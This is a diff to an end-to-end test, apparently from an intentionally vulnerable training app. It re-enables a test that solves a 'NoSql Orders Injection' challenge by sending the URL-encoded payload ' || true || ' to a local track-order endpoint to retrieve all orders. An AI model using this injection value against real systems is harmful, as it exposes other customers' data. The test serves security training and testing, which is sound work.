@@ -41,13 +41,23 @@ describe('/rest/product/reviews', () => {
   })
 
   describe('challenge "NoSql Orders Injection"', () => {
-    xit('should be possible to inject and get all the orders', () => {
+    it('should be possible to inject and get all the orders', () => {
       browser.waitForAngularEnabled(false)
-      browser.executeScript('var $http = angular.element(document.body).injector().get(\'$http\'); $http.get(\'/rest/track-order/%27%20%7C%7C%20true%20%7C%7C%20%27\');')
+      browser.executeScript(() => {
+        var xhttp = new XMLHttpRequest()
+        xhttp.onreadystatechange = function () {
+          if (this.status === 200) {
+            console.log('Success')
+          }
+        }
+        xhttp.open('GET', 'http://localhost:3000/rest/track-order/%27%20%7C%7C%20true%20%7C%7C%20%27', true)
+        xhttp.setRequestHeader('Content-type', 'text/plain')
+        xhttp.send()
+      })
       browser.driver.sleep(1000)
       browser.waitForAngularEnabled(true)
     })
-    // protractor.expect.challengeSolved({ challenge: 'NoSQL Injection Tier 3' })
+    protractor.expect.challengeSolved({ challenge: 'NoSQL Injection Tier 3' })
   })
 
   describe('challenge "Forged Review"', () => {
